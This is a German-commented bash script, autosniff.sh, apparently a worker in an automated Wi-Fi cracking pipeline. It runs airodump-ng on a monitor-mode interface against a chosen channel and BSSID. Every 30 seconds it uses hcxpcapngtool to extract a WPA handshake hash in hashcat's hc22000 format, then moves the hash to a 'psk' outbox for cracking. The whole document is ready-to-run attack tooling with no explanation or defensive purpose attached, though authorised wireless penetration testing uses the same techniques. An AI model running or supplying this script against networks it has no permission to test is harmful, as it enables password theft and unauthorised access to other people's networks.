#!/bin/bash
# ==============================================================================
# Skript: autosniff.sh
# ==============================================================================

# Argumente einlesen
TARGET_CHANNEL=$1
TARGET_BSSID=$2
TARGET_SSID=$3

INTERFACE="wlan0mon"
WORKSPACE="/home/atlantis/ordner/sniffing"
OUTBOX="/home/atlantis/ordner/outbox/psk"
ARCHIVE="/home/atlantis/ordner/archive/psk"
DURATION=3600


if [ -z "$TARGET_CHANNEL" ]; then
    echo "[BASH-PSK] Kein Kanal übergeben."
    exit 1
fi


mkdir -p $WORKSPACE
mkdir -p $OUTBOX
mkdir -p $ARCHIVE


TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
BSSID_SAFE=$(echo "$TARGET_BSSID" | tr ':' '_')
PREFIX="${WORKSPACE}/capture_${TIMESTAMP}_${BSSID_SAFE}"

TARGET_CAP="${PREFIX}-01.cap"
FINAL_HASH="${WORKSPACE}/hash_${TIMESTAMP}_${BSSID_SAFE}.hc22000"

echo "[BASH-PSK] Starte Erfassung auf Kanal $TARGET_CHANNEL für $TARGET_SSID"

# Sniffing starten
if [ -z "$TARGET_BSSID" ]; then
    # Fallback, falls keine BSSID übergeben wurde
    sudo airodump-ng $INTERFACE -c $TARGET_CHANNEL -w $PREFIX --output-format pcap > /dev/null 2>&1 &
else
    # Zielgerichteter Aufruf mit BSSID
    sudo airodump-ng $INTERFACE -c $TARGET_CHANNEL --bssid $TARGET_BSSID -w $PREFIX --output-format pcap > /dev/null 2>&1 &
fi

AIRODUMP_PID=$!

for (( i=0; i<$DURATION; i++ )); do
    if ! kill -0 $AIRODUMP_PID 2>/dev/null; then
        break
    fi

    if (( i > 0 && i % 30 == 0 )); then
        hcxpcapngtool -o "$FINAL_HASH" "$TARGET_CAP" > /dev/null 2>&1
        if [ -s "$FINAL_HASH" ]; then
            echo "[BASH-PSK] Artefakt gefunden nach ${i} Sekunden."
            sudo kill $AIRODUMP_PID > /dev/null 2>&1
            sleep 2
            mv $FINAL_HASH $OUTBOX/
            mv $TARGET_CAP $ARCHIVE/
            echo "[BASH-PSK] ERFOLG! Hash gespeichert."
            echo "[BASH-PSK] Worker beendet."
            exit 0
        fi
    fi

    sleep 1
done

# Timeout oder airodump abgestürzt
echo "[BASH-PSK] Beende Sniffing..."
sudo kill $AIRODUMP_PID > /dev/null 2>&1
sleep 2

if [ -s "$TARGET_CAP" ]; then
    mv $TARGET_CAP $ARCHIVE/
fi

echo "[BASH-PSK] Kein Handshake gefunden."
echo "[BASH-PSK] Worker beendet."
exit 1
